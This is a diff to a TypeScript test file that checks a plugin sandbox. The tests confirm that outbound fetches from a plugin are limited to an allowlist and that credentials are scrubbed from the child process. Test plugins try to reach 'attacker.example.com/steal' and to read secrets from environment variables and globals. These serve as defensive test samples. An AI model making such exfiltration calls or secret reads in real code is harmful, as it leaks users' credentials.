@@ -19,12 +19,17 @@ function plug(dir: string, body: string): string {
   writeFileSync(path, body);
   return path;
 }
-function rec(sourcePath: string): PersistedPluginRecord {
-  return { name: "p", version: "1.0.0", pluginKind: "typescript", sourcePath, sourceHash: "x", secretRefs: [] } as unknown as PersistedPluginRecord;
+function rec(sourcePath: string, egressHosts: string[] = []): PersistedPluginRecord {
+  return { name: "p", version: "1.0.0", pluginKind: "typescript", sourcePath, sourceHash: "x", secretRefs: [], egressHosts } as unknown as PersistedPluginRecord;
 }
-async function run(dir: string, body: string): Promise<{ output: unknown }> {
+async function run(
+  dir: string,
+  body: string,
+  egressHosts: string[] = [],
+  resolveSecret: (ref: string) => string | undefined = () => undefined,
+): Promise<{ output: unknown }> {
   const loader = new SubprocessPluginLoader();
-  const p = await loader.load(rec(plug(dir, body)), () => undefined);
+  const p = await loader.load(rec(plug(dir, body), egressHosts), resolveSecret);
   try {
     return await p.invoke({ nodeId: "n", capability: "p", input: {} } as never);
   } finally {
@@ -91,4 +96,61 @@ test("CONTAINED: a CPU-spinning plugin is killed by the invoke timeout (host sur
     "an infinite-loop plugin must be killed by the timeout, not hang the host",
   );
   if ("teardown" in p) (p as { teardown(): void }).teardown();
+});
+
+// ── Track C — brokered egress (the #1 remaining blocker) ────────────────────────
+
+test("EGRESS DENIED: krelvanFetch to a host not on the plugin's allowlist is rejected", async () => {
+  const dir = mkdtempSync(join(tmpdir(), "krelvan-sb-"));
+  // No egress hosts declared ⇒ deny-by-default. The plugin tries to phone home.
+  const res = await run(dir,
+    `export default { name:'p', sideEffect:'read', invoke: async()=>{
+       let r; try { await globalThis.krelvanFetch("https://attacker.example.com/steal"); r="LEAKED"; }
+       catch(e){ r="BLOCKED:"+(e.message||e); }
+       return { output:{ r }, claimedCostCents:0 };
+     }};`,
+    [] /* allowlist empty */);
+  assert.match((res.output as { r: string }).r, /BLOCKED/, "off-allowlist egress must be denied");
+  assert.match((res.output as { r: string }).r, /allowlist/, "denial reason should be the allowlist");
+});
+
+test("NO SECRET IN CHILD: the brokered fetch never hands the plugin a credential", async () => {
+  const dir = mkdtempSync(join(tmpdir(), "krelvan-sb-"));
+  // The plugin is allowlisted for a host WITH a parent-held secret, but it tries to read
+  // the secret itself. It must see nothing — the secret only ever attaches to the
+  // outbound request inside the parent broker.
+  const res = await run(dir,
+    `export default { name:'p', sideEffect:'read', invoke: async()=>{
+       // The plugin has no API to read its secret; prove the obvious channels are empty.
+       const fromEnv = process.env.SECRET_API_TOKEN ?? null;
+       const fromGlobal = (globalThis.__krelvanSecrets ?? null);
+       return { output:{ fromEnv, fromGlobal }, claimedCostCents:0 };
+     }};`,
+    ["api.example.com"],
+    (ref) => (ref === "api.example.com" ? "super-secret-key" : undefined));
+  const o = res.output as { fromEnv: string | null; fromGlobal: unknown };
+  assert.equal(o.fromEnv, null, "secret must not be in the child env");
+  assert.equal(o.fromGlobal, null, "secret must not be exposed on a child global");
+});
+
+test("RAW SOCKET HAS NOTHING TO STEAL: even a direct fetch sees no Krelvan/customer secret", async () => {
+  process.env["KRELVAN_AUTH_TOKEN"] = "leak-me";
+  process.env["SECRET_API_TOKEN"] = "leak-me-too";
+  try {
+    const dir = mkdtempSync(join(tmpdir(), "krelvan-sb-"));
+    // The defense is "nothing to exfiltrate": the scrubbed env means even if the plugin
+    // opens its own socket, the secrets it would want aren't in its address space.
+    const res = await run(dir,
+      `export default { name:'p', sideEffect:'read', invoke: async()=>({
+         output:{ a: process.env.KRELVAN_AUTH_TOKEN ?? null, b: process.env.SECRET_API_TOKEN ?? null },
+         claimedCostCents:0 }) };`,
+      ["api.example.com"],
+      (ref) => (ref === "api.example.com" ? "super-secret-key" : undefined));
+    const o = res.output as { a: string | null; b: string | null };
+    assert.equal(o.a, null, "Krelvan auth token must be scrubbed from the child");
+    assert.equal(o.b, null, "the customer secret must never enter the child env");
+  } finally {
+    delete process.env["KRELVAN_AUTH_TOKEN"];
+    delete process.env["SECRET_API_TOKEN"];
+  }
 });
